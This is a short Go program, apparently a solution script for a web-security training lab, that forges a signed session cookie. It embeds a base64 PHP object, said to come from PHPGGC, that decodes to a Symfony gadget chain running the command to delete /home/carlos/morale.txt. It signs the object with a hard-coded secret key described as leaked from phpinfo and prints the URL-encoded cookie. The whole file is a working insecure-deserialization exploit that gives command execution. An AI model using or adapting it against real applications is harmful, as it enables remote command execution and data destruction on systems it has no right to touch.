package main

import (
	"crypto/hmac"
	"crypto/sha1"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"net/url"
)

func main() {
	objectGeneratedByPhpGGC := "Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg=="
	leakedSecretKeyFromPhpInfo := "aykjt6gadf6j0twd863jc7vj71dg7o6q"

	// Create HMAC SHA1 signature
	h := hmac.New(sha1.New, []byte(leakedSecretKeyFromPhpInfo))
	h.Write([]byte(objectGeneratedByPhpGGC))
	signature := hex.EncodeToString(h.Sum(nil))

	// Create the JSON token
	token := map[string]string{
		"token":         objectGeneratedByPhpGGC,
		"sig_hmac_sha1": signature,
	}
	jsonToken, err := json.Marshal(token)
	if err != nil {
		fmt.Println("Error marshalling JSON:", err)
		return
	}

	// URL encode the JSON token
	cookie := url.QueryEscape(string(jsonToken))

	// Output the cookie
	fmt.Println(cookie)
}
